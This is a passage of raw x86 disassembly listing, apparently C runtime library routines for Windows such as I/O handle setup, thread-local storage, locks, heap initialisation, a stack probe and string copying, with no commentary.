  424f14:	call   DWORD PTR ds:0x429078
  424f1a:	mov    esi,eax
  424f1c:	cmp    esi,ebx
  424f1e:	je     0x424f10
  424f20:	cmp    BYTE PTR [esi],bl
  424f22:	je     0x424f2e
  424f24:	inc    eax
  424f25:	cmp    BYTE PTR [eax],bl
  424f27:	jne    0x424f24
  424f29:	inc    eax
  424f2a:	cmp    BYTE PTR [eax],bl
  424f2c:	jne    0x424f24
  424f2e:	sub    eax,esi
  424f30:	inc    eax
  424f31:	mov    ebp,eax
  424f33:	push   ebp
  424f34:	call   0x426072
  424f39:	mov    edi,eax
  424f3b:	cmp    edi,ebx
  424f3d:	pop    ecx
  424f3e:	jne    0x424f44
  424f40:	xor    edi,edi
  424f42:	jmp    0x424f4f
  424f44:	push   ebp
  424f45:	push   esi
  424f46:	push   edi
  424f47:	call   0x426090
  424f4c:	add    esp,0xc
  424f4f:	push   esi
  424f50:	call   DWORD PTR ds:0x429074
  424f56:	mov    eax,edi
  424f58:	pop    edi
  424f59:	pop    esi
  424f5a:	pop    ebp
  424f5b:	pop    ebx
  424f5c:	pop    ecx
  424f5d:	pop    ecx
  424f5e:	ret    
  424f5f:	sub    esp,0x48
  424f62:	push   ebx
  424f63:	mov    ebx,0x480
  424f68:	push   ebx
  424f69:	call   0x426072
  424f6e:	test   eax,eax
  424f70:	pop    ecx
  424f71:	jne    0x424f7b
  424f73:	or     eax,0xffffffff
  424f76:	jmp    0x425158
  424f7b:	mov    ds:0x45e160,eax
  424f80:	mov    DWORD PTR ds:0x45e148,0x20
  424f8a:	lea    ecx,[eax+0x480]
  424f90:	jmp    0x424fb0
  424f92:	and    BYTE PTR [eax+0x4],0x0
  424f96:	or     DWORD PTR [eax],0xffffffff
  424f99:	and    DWORD PTR [eax+0x8],0x0
  424f9d:	mov    BYTE PTR [eax+0x5],0xa
  424fa1:	mov    ecx,DWORD PTR ds:0x45e160
  424fa7:	add    eax,0x24
  424faa:	add    ecx,0x480
  424fb0:	cmp    eax,ecx
  424fb2:	jb     0x424f92
  424fb4:	push   ebp
  424fb5:	push   esi
  424fb6:	push   edi
  424fb7:	lea    eax,[esp+0x14]
  424fbb:	push   eax
  424fbc:	call   DWORD PTR ds:0x429050
  424fc2:	cmp    WORD PTR [esp+0x46],0x0
  424fc8:	je     0x4250b7
  424fce:	mov    eax,DWORD PTR [esp+0x48]
  424fd2:	test   eax,eax
  424fd4:	je     0x4250b7
  424fda:	mov    edi,DWORD PTR [eax]
  424fdc:	lea    ebp,[eax+0x4]
  424fdf:	lea    eax,[edi+ebp*1]
  424fe2:	mov    DWORD PTR [esp+0x10],eax
  424fe6:	mov    eax,0x800
  424feb:	cmp    edi,eax
  424fed:	jl     0x424ff1
  424fef:	mov    edi,eax
  424ff1:	cmp    DWORD PTR ds:0x45e148,edi
  424ff7:	jge    0x425047
  424ff9:	mov    esi,0x45e164
  424ffe:	push   ebx
  424fff:	call   0x426072
  425004:	test   eax,eax
  425006:	pop    ecx
  425007:	je     0x425041
  425009:	add    DWORD PTR ds:0x45e148,0x20
  425010:	mov    DWORD PTR [esi],eax
  425012:	lea    ecx,[eax+0x480]
  425018:	jmp    0x425030
  42501a:	and    BYTE PTR [eax+0x4],0x0
  42501e:	or     DWORD PTR [eax],0xffffffff
  425021:	and    DWORD PTR [eax+0x8],0x0
  425025:	mov    BYTE PTR [eax+0x5],0xa
  425029:	mov    ecx,DWORD PTR [esi]
  42502b:	add    eax,0x24
  42502e:	add    ecx,ebx
  425030:	cmp    eax,ecx
  425032:	jb     0x42501a
  425034:	add    esi,0x4
  425037:	cmp    DWORD PTR ds:0x45e148,edi
  42503d:	jl     0x424ffe
  42503f:	jmp    0x425047
  425041:	mov    edi,DWORD PTR ds:0x45e148
  425047:	xor    ebx,ebx
  425049:	test   edi,edi
  42504b:	jle    0x4250b7
  42504d:	mov    eax,DWORD PTR [esp+0x10]
  425051:	mov    eax,DWORD PTR [eax]
  425053:	cmp    eax,0xffffffff
  425056:	je     0x4250ac
  425058:	mov    cl,BYTE PTR [ebp+0x0]
  42505b:	test   cl,0x1
  42505e:	je     0x4250ac
  425060:	test   cl,0x8
  425063:	jne    0x425070
  425065:	push   eax
  425066:	call   DWORD PTR ds:0x42908c
  42506c:	test   eax,eax
  42506e:	je     0x4250ac
  425070:	mov    ecx,ebx
  425072:	mov    eax,ebx
  425074:	and    eax,0x1f
  425077:	lea    eax,[eax+eax*8]
  42507a:	sar    ecx,0x5
  42507d:	mov    ecx,DWORD PTR [ecx*4+0x45e160]
  425084:	lea    esi,[ecx+eax*4]
  425087:	mov    eax,DWORD PTR [esp+0x10]
  42508b:	mov    eax,DWORD PTR [eax]
  42508d:	mov    DWORD PTR [esi],eax
  42508f:	mov    al,BYTE PTR [ebp+0x0]
  425092:	mov    BYTE PTR [esi+0x4],al
  425095:	lea    eax,[esi+0xc]
  425098:	push   0xfa0
  42509d:	push   eax
  42509e:	call   0x4263dd
  4250a3:	test   eax,eax
  4250a5:	pop    ecx
  4250a6:	pop    ecx
  4250a7:	je     0x4250d7
  4250a9:	inc    DWORD PTR [esi+0x8]
  4250ac:	add    DWORD PTR [esp+0x10],0x4
  4250b1:	inc    ebx
  4250b2:	inc    ebp
  4250b3:	cmp    ebx,edi
  4250b5:	jl     0x42504d
  4250b7:	xor    ebx,ebx
  4250b9:	mov    ecx,DWORD PTR ds:0x45e160
  4250bf:	lea    eax,[ebx+ebx*8]
  4250c2:	lea    esi,[ecx+eax*4]
  4250c5:	cmp    DWORD PTR [esi],0xffffffff
  4250c8:	jne    0x425139
  4250ca:	test   ebx,ebx
  4250cc:	mov    BYTE PTR [esi+0x4],0x81
  4250d0:	jne    0x4250dc
  4250d2:	push   0xfffffff6
  4250d4:	pop    eax
  4250d5:	jmp    0x4250e6
  4250d7:	or     eax,0xffffffff
  4250da:	jmp    0x425155
  4250dc:	mov    eax,ebx
  4250de:	dec    eax
  4250df:	neg    eax
  4250e1:	sbb    eax,eax
  4250e3:	add    eax,0xfffffff5
  4250e6:	push   eax
  4250e7:	call   DWORD PTR ds:0x429068
  4250ed:	mov    edi,eax
  4250ef:	cmp    edi,0xffffffff
  4250f2:	je     0x425133
  4250f4:	push   edi
  4250f5:	call   DWORD PTR ds:0x42908c
  4250fb:	test   eax,eax
  4250fd:	je     0x425133
  4250ff:	and    eax,0xff
  425104:	cmp    eax,0x2
  425107:	mov    DWORD PTR [esi],edi
  425109:	jne    0x425111
  42510b:	or     BYTE PTR [esi+0x4],0x40
  42510f:	jmp    0x42511a
  425111:	cmp    eax,0x3
  425114:	jne    0x42511a
  425116:	or     BYTE PTR [esi+0x4],0x8
  42511a:	lea    eax,[esi+0xc]
  42511d:	push   0xfa0
  425122:	push   eax
  425123:	call   0x4263dd
  425128:	test   eax,eax
  42512a:	pop    ecx
  42512b:	pop    ecx
  42512c:	je     0x4250d7
  42512e:	inc    DWORD PTR [esi+0x8]
  425131:	jmp    0x42513d
  425133:	or     BYTE PTR [esi+0x4],0x40
  425137:	jmp    0x42513d
  425139:	or     BYTE PTR [esi+0x4],0x80
  42513d:	inc    ebx
  42513e:	cmp    ebx,0x3
  425141:	jl     0x4250b9
  425147:	push   DWORD PTR ds:0x45e148
  42514d:	call   DWORD PTR ds:0x429088
  425153:	xor    eax,eax
  425155:	pop    edi
  425156:	pop    esi
  425157:	pop    ebp
  425158:	pop    ebx
  425159:	add    esp,0x48
  42515c:	ret    
  42515d:	push   0xc
  42515f:	push   0x4295b8
  425164:	call   0x425350
  425169:	mov    DWORD PTR [ebp-0x1c],0x42a010
  425170:	cmp    DWORD PTR [ebp-0x1c],0x42a010
  425177:	jae    0x42519b
  425179:	and    DWORD PTR [ebp-0x4],0x0
  42517d:	mov    eax,DWORD PTR [ebp-0x1c]
  425180:	mov    eax,DWORD PTR [eax]
  425182:	test   eax,eax
  425184:	je     0x425191
  425186:	call   eax
  425188:	jmp    0x425191
  42518a:	xor    eax,eax
  42518c:	inc    eax
  42518d:	ret    
  42518e:	mov    esp,DWORD PTR [ebp-0x18]
  425191:	or     DWORD PTR [ebp-0x4],0xffffffff
  425195:	add    DWORD PTR [ebp-0x1c],0x4
  425199:	jmp    0x425170
  42519b:	call   0x42538b
  4251a0:	ret    
  4251a1:	push   0xc
  4251a3:	push   0x4295c8
  4251a8:	call   0x425350
  4251ad:	mov    DWORD PTR [ebp-0x1c],0x42a018
  4251b4:	cmp    DWORD PTR [ebp-0x1c],0x42a018
  4251bb:	jae    0x4251df
  4251bd:	and    DWORD PTR [ebp-0x4],0x0
  4251c1:	mov    eax,DWORD PTR [ebp-0x1c]
  4251c4:	mov    eax,DWORD PTR [eax]
  4251c6:	test   eax,eax
  4251c8:	je     0x4251d5
  4251ca:	call   eax
  4251cc:	jmp    0x4251d5
  4251ce:	xor    eax,eax
  4251d0:	inc    eax
  4251d1:	ret    
  4251d2:	mov    esp,DWORD PTR [ebp-0x18]
  4251d5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4251d9:	add    DWORD PTR [ebp-0x1c],0x4
  4251dd:	jmp    0x4251b4
  4251df:	call   0x42538b
  4251e4:	ret    
  4251e5:	call   0x425426
  4251ea:	mov    eax,ds:0x45d304
  4251ef:	cmp    eax,0xffffffff
  4251f2:	je     0x425202
  4251f4:	push   eax
  4251f5:	call   DWORD PTR ds:0x429094
  4251fb:	or     DWORD PTR ds:0x45d304,0xffffffff
  425202:	ret    
  425203:	push   ebx
  425204:	push   esi
  425205:	call   DWORD PTR ds:0x429028
  42520b:	push   DWORD PTR ds:0x45d304
  425211:	mov    ebx,eax
  425213:	call   DWORD PTR ds:0x4290a4
  425219:	mov    esi,eax
  42521b:	test   esi,esi
  42521d:	jne    0x425268
  42521f:	push   0x88
  425224:	push   0x1
  425226:	call   0x426468
  42522b:	mov    esi,eax
  42522d:	test   esi,esi
  42522f:	pop    ecx
  425230:	pop    ecx
  425231:	je     0x425260
  425233:	push   esi
  425234:	push   DWORD PTR ds:0x45d304
  42523a:	call   DWORD PTR ds:0x4290a0
  425240:	test   eax,eax
  425242:	je     0x425260
  425244:	mov    DWORD PTR [esi+0x54],0x45d258
  42524b:	mov    DWORD PTR [esi+0x14],0x1
  425252:	call   DWORD PTR ds:0x42909c
  425258:	or     DWORD PTR [esi+0x4],0xffffffff
  42525c:	mov    DWORD PTR [esi],eax
  42525e:	jmp    0x425268
  425260:	push   0x10
  425262:	call   0x424416
  425267:	pop    ecx
  425268:	push   ebx
  425269:	call   DWORD PTR ds:0x429098
  42526f:	mov    eax,esi
  425271:	pop    esi
  425272:	pop    ebx
  425273:	ret    
  425274:	call   0x4253dd
  425279:	test   eax,eax
  42527b:	je     0x42528d
  42527d:	call   DWORD PTR ds:0x4290a8
  425283:	cmp    eax,0xffffffff
  425286:	mov    ds:0x45d304,eax
  42528b:	jne    0x425295
  42528d:	call   0x4251e5
  425292:	xor    eax,eax
  425294:	ret    
  425295:	push   esi
  425296:	push   0x88
  42529b:	push   0x1
  42529d:	call   0x426468
  4252a2:	mov    esi,eax
  4252a4:	test   esi,esi
  4252a6:	pop    ecx
  4252a7:	pop    ecx
  4252a8:	je     0x4252da
  4252aa:	push   esi
  4252ab:	push   DWORD PTR ds:0x45d304
  4252b1:	call   DWORD PTR ds:0x4290a0
  4252b7:	test   eax,eax
  4252b9:	je     0x4252da
  4252bb:	mov    DWORD PTR [esi+0x54],0x45d258
  4252c2:	mov    DWORD PTR [esi+0x14],0x1
  4252c9:	call   DWORD PTR ds:0x42909c
  4252cf:	or     DWORD PTR [esi+0x4],0xffffffff
  4252d3:	mov    DWORD PTR [esi],eax
  4252d5:	xor    eax,eax
  4252d7:	inc    eax
  4252d8:	pop    esi
  4252d9:	ret    
  4252da:	call   0x4251e5
  4252df:	xor    eax,eax
  4252e1:	pop    esi
  4252e2:	ret    
  4252e3:	cmp    DWORD PTR ds:0x45dac4,0x2
  4252ea:	jne    0x4252f9
  4252ec:	cmp    DWORD PTR ds:0x45dad0,0x5
  4252f3:	jb     0x4252f9
  4252f5:	xor    eax,eax
  4252f7:	inc    eax
  4252f8:	ret    
  4252f9:	push   0x3
  4252fb:	pop    eax
  4252fc:	ret    
  4252fd:	xor    eax,eax
  4252ff:	cmp    DWORD PTR [esp+0x4],eax
  425303:	push   0x0
  425305:	sete   al
  425308:	push   0x1000
  42530d:	push   eax
  42530e:	call   DWORD PTR ds:0x429034
  425314:	test   eax,eax
  425316:	mov    ds:0x45e140,eax
  42531b:	je     0x425347
  42531d:	call   0x4252e3
  425322:	cmp    eax,0x3
  425325:	mov    ds:0x45e144,eax
  42532a:	jne    0x42534a
  42532c:	push   0x3f8
  425331:	call   0x4266ea
  425336:	test   eax,eax
  425338:	pop    ecx
  425339:	jne    0x42534a
  42533b:	push   DWORD PTR ds:0x45e140
  425341:	call   DWORD PTR ds:0x4290ac
  425347:	xor    eax,eax
  425349:	ret    
  42534a:	xor    eax,eax
  42534c:	inc    eax
  42534d:	ret    
  42534e:	int3   
  42534f:	int3   
  425350:	push   0x427218
  425355:	mov    eax,fs:0x0
  42535b:	push   eax
  42535c:	mov    eax,DWORD PTR [esp+0x10]
  425360:	mov    DWORD PTR [esp+0x10],ebp
  425364:	lea    ebp,[esp+0x10]
  425368:	sub    esp,eax
  42536a:	push   ebx
  42536b:	push   esi
  42536c:	push   edi
  42536d:	mov    eax,DWORD PTR [ebp-0x8]
  425370:	mov    DWORD PTR [ebp-0x18],esp
  425373:	push   eax
  425374:	mov    eax,DWORD PTR [ebp-0x4]
  425377:	mov    DWORD PTR [ebp-0x4],0xffffffff
  42537e:	mov    DWORD PTR [ebp-0x8],eax
  425381:	lea    eax,[ebp-0x10]
  425384:	mov    fs:0x0,eax
  42538a:	ret    
  42538b:	mov    ecx,DWORD PTR [ebp-0x10]
  42538e:	mov    DWORD PTR fs:0x0,ecx
  425395:	pop    ecx
  425396:	pop    edi
  425397:	pop    esi
  425398:	pop    ebx
  425399:	leave  
  42539a:	push   ecx
  42539b:	ret    
  42539c:	int3   
  42539d:	int3   
  42539e:	int3   
  42539f:	int3   
  4253a0:	cmp    eax,0x1000
  4253a5:	jae    0x4253b5
  4253a7:	neg    eax
  4253a9:	add    eax,esp
  4253ab:	add    eax,0x4
  4253ae:	test   DWORD PTR [eax],eax
  4253b0:	xchg   esp,eax
  4253b1:	mov    eax,DWORD PTR [eax]
  4253b3:	push   eax
  4253b4:	ret    
  4253b5:	push   ecx
  4253b6:	lea    ecx,[esp+0x8]
  4253ba:	sub    ecx,0x1000
  4253c0:	sub    eax,0x1000
  4253c5:	test   DWORD PTR [ecx],eax
  4253c7:	cmp    eax,0x1000
  4253cc:	jae    0x4253ba
  4253ce:	sub    ecx,eax
  4253d0:	mov    eax,esp
  4253d2:	test   DWORD PTR [ecx],eax
  4253d4:	mov    esp,ecx
  4253d6:	mov    ecx,DWORD PTR [eax]
  4253d8:	mov    eax,DWORD PTR [eax+0x4]
  4253db:	push   eax
  4253dc:	ret    
  4253dd:	push   esi
  4253de:	push   edi
  4253df:	xor    esi,esi
  4253e1:	mov    edi,0x45dc20
  4253e6:	cmp    DWORD PTR [esi*8+0x45d314],0x1
  4253ee:	jne    0x42540e
  4253f0:	lea    eax,[esi*8+0x45d310]
  4253f7:	mov    DWORD PTR [eax],edi
  4253f9:	push   0xfa0
  4253fe:	push   DWORD PTR [eax]
  425400:	add    edi,0x18
  425403:	call   0x4263dd
  425408:	test   eax,eax
  42540a:	pop    ecx
  42540b:	pop    ecx
  42540c:	je     0x42541a
  42540e:	inc    esi
  42540f:	cmp    esi,0x24
  425412:	jl     0x4253e6
  425414:	xor    eax,eax
  425416:	inc    eax
  425417:	pop    edi
  425418:	pop    esi
  425419:	ret    
  42541a:	and    DWORD PTR [esi*8+0x45d310],0x0
  425422:	xor    eax,eax
  425424:	jmp    0x425417
  425426:	push   ebx
  425427:	mov    ebx,DWORD PTR ds:0x429090
  42542d:	push   esi
  42542e:	mov    esi,0x45d310
  425433:	push   edi
  425434:	mov    edi,DWORD PTR [esi]
  425436:	test   edi,edi
  425438:	je     0x42544d
  42543a:	cmp    DWORD PTR [esi+0x4],0x1
  42543e:	je     0x42544d
  425440:	push   edi
  425441:	call   ebx
  425443:	push   edi
  425444:	call   0x425f5a
  425449:	and    DWORD PTR [esi],0x0
  42544c:	pop    ecx
  42544d:	add    esi,0x8
  425450:	cmp    esi,0x45d430
  425456:	jl     0x425434
  425458:	mov    esi,0x45d310
  42545d:	pop    edi
  42545e:	mov    eax,DWORD PTR [esi]
  425460:	test   eax,eax
  425462:	je     0x42546d
  425464:	cmp    DWORD PTR [esi+0x4],0x1
  425468:	jne    0x42546d
  42546a:	push   eax
  42546b:	call   ebx
  42546d:	add    esi,0x8
  425470:	cmp    esi,0x45d430
  425476:	jl     0x42545e
  425478:	pop    esi
  425479:	pop    ebx
  42547a:	ret    
  42547b:	push   ebp
  42547c:	mov    ebp,esp
  42547e:	mov    eax,DWORD PTR [ebp+0x8]
  425481:	push   DWORD PTR [eax*8+0x45d310]
  425488:	call   DWORD PTR ds:0x4290b4
  42548e:	pop    ebp
  42548f:	ret    
  425490:	push   ebp
  425491:	mov    ebp,esp
  425493:	push   esi
  425494:	mov    esi,DWORD PTR [ebp+0x8]
  425497:	lea    esi,[esi*8+0x45d310]
  42549e:	cmp    DWORD PTR [esi],0x0
  4254a1:	je     0x4254a8
  4254a3:	xor    eax,eax
  4254a5:	inc    eax
  4254a6:	jmp    0x42550c
  4254a8:	push   edi
  4254a9:	push   0x18
  4254ab:	call   0x426072
  4254b0:	mov    edi,eax
  4254b2:	test   edi,edi
  4254b4:	pop    ecx
  4254b5:	jne    0x4254c6
  4254b7:	call   0x4272f0
  4254bc:	mov    DWORD PTR [eax],0xc
  4254c2:	xor    eax,eax
  4254c4:	jmp    0x42550b
  4254c6:	push   0xa
  4254c8:	call   0x42550f
  4254cd:	cmp    DWORD PTR [esi],0x0
  4254d0:	pop    ecx
  4254d1:	jne    0x4254f9
  4254d3:	push   0xfa0
  4254d8:	push   edi
  4254d9:	call   0x4263dd
  4254de:	test   eax,eax
  4254e0:	pop    ecx
  4254e1:	pop    ecx
  4254e2:	jne    0x4254f5
  4254e4:	push   edi
  4254e5:	call   0x425f5a
  4254ea:	push   0xa
  4254ec:	call   0x42547b
  4254f1:	pop    ecx
  4254f2:	pop    ecx
  4254f3:	jmp    0x4254b7
  4254f5:	mov    DWORD PTR [esi],edi
  4254f7:	jmp    0x425500
  4254f9:	push   edi
  4254fa:	call   0x425f5a
  4254ff:	pop    ecx
  425500:	push   0xa
  425502:	call   0x42547b
  425507:	xor    eax,eax
  425509:	pop    ecx
  42550a:	inc    eax
  42550b:	pop    edi
  42550c:	pop    esi
  42550d:	pop    ebp
  42550e:	ret    
  42550f:	push   ebp
  425510:	mov    ebp,esp
  425512:	mov    eax,DWORD PTR [ebp+0x8]
  425515:	push   esi
  425516:	lea    esi,[eax*8+0x45d310]
  42551d:	cmp    DWORD PTR [esi],0x0
  425520:	jne    0x425535
  425522:	push   eax
  425523:	call   0x425490
  425528:	test   eax,eax
  42552a:	pop    ecx
  42552b:	jne    0x425535
  42552d:	push   0x11
  42552f:	call   0x424416
  425534:	pop    ecx
  425535:	push   DWORD PTR [esi]
  425537:	call   DWORD PTR ds:0x4290b8
  42553d:	pop    esi
  42553e:	pop    ebp
  42553f:	ret    
  425540:	push   esi
  425541:	push   DWORD PTR ds:0x45e268
  425547:	call   0x4274a6
  42554c:	pop    ecx
  42554d:	mov    ecx,DWORD PTR ds:0x45e264
  425553:	mov    esi,eax
  425555:	mov    eax,ds:0x45e268
  42555a:	mov    edx,ecx
  42555c:	sub    edx,eax
  42555e:	add    edx,0x4
  425561:	cmp    esi,edx
  425563:	jae    0x4255b3
  425565:	mov    ecx,0x800
  42556a:	cmp    esi,ecx
  42556c:	jae    0x425570
  42556e:	mov    ecx,esi
  425570:	add    ecx,esi
  425572:	push   ecx
  425573:	push   eax
  425574:	call   0x4272f9
  425579:	test   eax,eax
  42557b:	pop    ecx
  42557c:	pop    ecx
  42557d:	jne    0x425596
  42557f:	add    esi,0x10
  425582:	push   esi
  425583:	push   DWORD PTR ds:0x45e268
  425589:	call   0x4272f9
  42558e:	test   eax,eax
  425590:	pop    ecx
  425591:	pop    ecx
  425592:	jne    0x425596
  425594:	pop    esi
  425595:	ret    
  425596:	mov    ecx,DWORD PTR ds:0x45e264
  42559c:	sub    ecx,DWORD PTR ds:0x45e268
  4255a2:	mov    ds:0x45e268,eax
  4255a7:	sar    ecx,0x2
  4255aa:	lea    ecx,[eax+ecx*4]
  4255ad:	mov    DWORD PTR ds:0x45e264,ecx
  4255b3:	mov    DWORD PTR [ecx],edi
  4255b5:	add    DWORD PTR ds:0x45e264,0x4
  4255bc:	mov    eax,edi
  4255be:	pop    esi
  4255bf:	ret    
  4255c0:	push   0x80
  4255c5:	call   0x426072
  4255ca:	test   eax,eax
  4255cc:	pop    ecx
  4255cd:	mov    ds:0x45e268,eax
  4255d2:	jne    0x4255d8
  4255d4:	push   0x18
  4255d6:	pop    eax
  4255d7:	ret    
  4255d8:	and    DWORD PTR [eax],0x0
  4255db:	mov    eax,ds:0x45e268
  4255e0:	mov    ds:0x45e264,eax
  4255e5:	xor    eax,eax
  4255e7:	ret    
  4255e8:	push   0xc
  4255ea:	push   0x4295d8
  4255ef:	call   0x425350
  4255f4:	call   0x424661
  4255f9:	and    DWORD PTR [ebp-0x4],0x0
  4255fd:	mov    edi,DWORD PTR [ebp+0x8]
  425600:	call   0x425540
  425605:	mov    DWORD PTR [ebp-0x1c],eax
  425608:	or     DWORD PTR [ebp-0x4],0xffffffff
  42560c:	call   0x42561a
  425611:	mov    eax,DWORD PTR [ebp-0x1c]
  425614:	call   0x42538b
  425619:	ret    
  42561a:	call   0x42466a
  42561f:	ret    
  425620:	push   DWORD PTR [esp+0x4]
  425624:	call   0x4255e8
  425629:	neg    eax
  42562b:	sbb    eax,eax
  42562d:	neg    eax
  42562f:	pop    ecx
  425630:	dec    eax
  425631:	ret    
  425632:	push   ebp
  425633:	mov    ebp,esp
  425635:	sub    esp,0x10
  425638:	push   ebx
  425639:	xor    ebx,ebx
  42563b:	cmp    DWORD PTR ds:0x45dd70,ebx
  425641:	push   esi
  425642:	push   edi
  425643:	jne    0x4256b2
  425645:	push   0x429648
  42564a:	call   DWORD PTR ds:0x4290bc
  425650:	mov    edi,eax
  425652:	cmp    edi,ebx
  425654:	je     0x4256ed
  42565a:	mov    esi,DWORD PTR ds:0x429020
  425660:	push   0x42963c
  425665:	push   edi
  425666:	call   esi
  425668:	test   eax,eax
  42566a:	mov    ds:0x45dd70,eax
  42566f:	je     0x4256ed
  425671:	push   0x42962c
  425676:	push   edi
  425677:	call   esi
  425679:	push   0x429618
  42567e:	push   edi
  42567f:	mov    ds:0x45dd74,eax
  425684:	call   esi
  425686:	cmp    DWORD PTR ds:0x45dac4,0x2
  42568d:	mov    ds:0x45dd78,eax
  425692:	jne    0x4256b2
  425694:	push   0x4295fc
  425699:	push   edi
  42569a:	call   esi
  42569c:	test   eax,eax
  42569e:	mov    ds:0x45dd80,eax
  4256a3:	je     0x4256b2
  4256a5:	push   0x4295e4
  4256aa:	push   edi
  4256ab:	call   esi
  4256ad:	mov    ds:0x45dd7c,eax
  4256b2:	mov    eax,ds:0x45dd7c
  4256b7:	test   eax,eax
  4256b9:	je     0x4256f7
  4256bb:	call   eax
  4256bd:	test   eax,eax
  4256bf:	je     0x4256de
  4256c1:	lea    ecx,[ebp-0x4]
  4256c4:	push   ecx
  4256c5:	push   0xc
  4256c7:	lea    ecx,[ebp-0x10]
  4256ca:	push   ecx
  4256cb:	push   0x1
  4256cd:	push   eax
  4256ce:	call   DWORD PTR ds:0x45dd80
  4256d4:	test   eax,eax
  4256d6:	je     0x4256de
  4256d8:	test   BYTE PTR [ebp-0x8],0x1
  4256dc:	jne    0x4256f7
  4256de:	cmp    DWORD PTR ds:0x45dad0,0x4
  4256e5:	jb     0x4256f1
  4256e7:	or     BYTE PTR [ebp+0x12],0x20
  4256eb:	jmp    0x425716
  4256ed:	xor    eax,eax
  4256ef:	jmp    0x425726
  4256f1:	or     BYTE PTR [ebp+0x12],0x4
  4256f5:	jmp    0x425716
  4256f7:	mov    eax,ds:0x45dd74
  4256fc:	test   eax,eax
  4256fe:	je     0x425716
  425700:	call   eax
  425702:	mov    ebx,eax
  425704:	test   ebx,ebx
  425706:	je     0x425716
  425708:	mov    eax,ds:0x45dd78
  42570d:	test   eax,eax
  42570f:	je     0x425716
  425711:	push   ebx
  425712:	call   eax
  425714:	mov    ebx,eax
  425716:	push   DWORD PTR [ebp+0x10]
  425719:	push   DWORD PTR [ebp+0xc]
  42571c:	push   DWORD PTR [ebp+0x8]
  42571f:	push   ebx
  425720:	call   DWORD PTR ds:0x45dd70
  425726:	pop    edi
  425727:	pop    esi
  425728:	pop    ebx
  425729:	leave  
  42572a:	ret    
  42572b:	int3   
  42572c:	int3   
  42572d:	int3   
  42572e:	int3   
  42572f:	int3   
  425730:	push   edi
  425731:	mov    edi,DWORD PTR [esp+0x8]
  425735:	jmp    0x4257a5
  425737:	lea    esp,[esp+0x0]
  42573e:	mov    edi,edi
  425740:	mov    ecx,DWORD PTR [esp+0x4]
  425744:	push   edi
  425745:	test   ecx,0x3
  42574b:	je     0x425760
  42574d:	mov    al,BYTE PTR [ecx]
  42574f:	add    ecx,0x1
  425752:	test   al,al
  425754:	je     0x425793
  425756:	test   ecx,0x3
  42575c:	jne    0x42574d
  42575e:	mov    edi,edi
  425760:	mov    eax,DWORD PTR [ecx]
  425762:	mov    edx,0x7efefeff
  425767:	add    edx,eax
  425769:	xor    eax,0xffffffff
  42576c:	xor    eax,edx
  42576e:	add    ecx,0x4
  425771:	test   eax,0x81010100
  425776:	je     0x425760
  425778:	mov    eax,DWORD PTR [ecx-0x4]
  42577b:	test   al,al
  42577d:	je     0x4257a2
  42577f:	test   ah,ah
  425781:	je     0x42579d
  425783:	test   eax,0xff0000
  425788:	je     0x425798
  42578a:	test   eax,0xff000000
  42578f:	je     0x425793
  425791:	jmp    0x425760
  425793:	lea    edi,[ecx-0x1]
  425796:	jmp    0x4257a5
  425798:	lea    edi,[ecx-0x2]
  42579b:	jmp    0x4257a5
  42579d:	lea    edi,[ecx-0x3]
  4257a0:	jmp    0x4257a5
  4257a2:	lea    edi,[ecx-0x4]
  4257a5:	mov    ecx,DWORD PTR [esp+0xc]
  4257a9:	test   ecx,0x3
  4257af:	je     0x4257ce
  4257b1:	mov    dl,BYTE PTR [ecx]
  4257b3:	add    ecx,0x1
  4257b6:	test   dl,dl
  4257b8:	je     0x425820
  4257ba:	mov    BYTE PTR [edi],dl
  4257bc:	add    edi,0x1
  4257bf:	test   ecx,0x3
  4257c5:	jne    0x4257b1
  4257c7:	jmp    0x4257ce
  4257c9:	mov    DWORD PTR [edi],edx
  4257cb:	add    edi,0x4
  4257ce:	mov    edx,0x7efefeff
  4257d3:	mov    eax,DWORD PTR [ecx]
  4257d5:	add    edx,eax
  4257d7:	xor    eax,0xffffffff
  4257da:	xor    eax,edx
  4257dc:	mov    edx,DWORD PTR [ecx]
  4257de:	add    ecx,0x4
  4257e1:	test   eax,0x81010100
  4257e6:	je     0x4257c9
  4257e8:	test   dl,dl
  4257ea:	je     0x425820
  4257ec:	test   dh,dh
  4257ee:	je     0x425817
  4257f0:	test   edx,0xff0000
  4257f6:	je     0x42580a
  4257f8:	test   edx,0xff000000
  4257fe:	je     0x425802
  425800:	jmp    0x4257c9
  425802:	mov    DWORD PTR [edi],edx
  425804:	mov    eax,DWORD PTR [esp+0x8]
  425808:	pop    edi
  425809:	ret    
  42580a:	mov    WORD PTR [edi],dx
  42580d:	mov    eax,DWORD PTR [esp+0x8]
  425811:	mov    BYTE PTR [edi+0x2],0x0
  425815:	pop    edi
  425816:	ret    
  425817:	mov    WORD PTR [edi],dx
  42581a:	mov    eax,DWORD PTR [esp+0x8]
  42581e:	pop    edi
  42581f:	ret    
  425820:	mov    BYTE PTR [edi],dl
  425822:	mov    eax,DWORD PTR [esp+0x8]
  425826:	pop    edi
  425827:	ret    
  425828:	int3   
  425829:	int3   
  42582a:	int3   
  42582b:	int3   
  42582c:	int3   
  42582d:	int3   
  42582e:	int3   
  42582f:	int3   
  425830:	mov    ecx,DWORD PTR [esp+0xc]
  425834:	push   edi
  425835:	test   ecx,ecx
  425837:	je     0x4258cf
  42583d:	push   esi
  42583e:	push   ebx
  42583f:	mov    ebx,ecx
  425841:	mov    esi,DWORD PTR [esp+0x14]
  425845:	test   esi,0x3
  42584b:	mov    edi,DWORD PTR [esp+0x10]
  42584f:	jne    0x42585c
  425851:	shr    ecx,0x2
  425854:	jne    0x4258df
  42585a:	jmp    0x425883
  42585c:	mov    al,BYTE PTR [esi]
  42585e:	add    esi,0x1
  425861:	mov    BYTE PTR [edi],al
  425863:	add    edi,0x1
  425866:	sub    ecx,0x1
  425869:	je     0x425896
  42586b:	test   al,al
  42586d:	je     0x42589e
  42586f:	test   esi,0x3
  425875:	jne    0x42585c
  425877:	mov    ebx,ecx
  425879:	shr    ecx,0x2
  42587c:	jne    0x4258df
  42587e:	and    ebx,0x3
  425881:	je     0x425896
  425883:	mov    al,BYTE PTR [esi]
  425885:	add    esi,0x1
  425888:	mov    BYTE PTR [edi],al
  42588a:	add    edi,0x1
  42588d:	test   al,al
  42588f:	je     0x4258c8
  425891:	sub    ebx,0x1
  425894:	jne    0x425883
  425896:	mov    eax,DWORD PTR [esp+0x10]
  42589a:	pop    ebx
  42589b:	pop    esi
  42589c:	pop    edi
  42589d:	ret    
  42589e:	test   edi,0x3
  4258a4:	je     0x4258bc
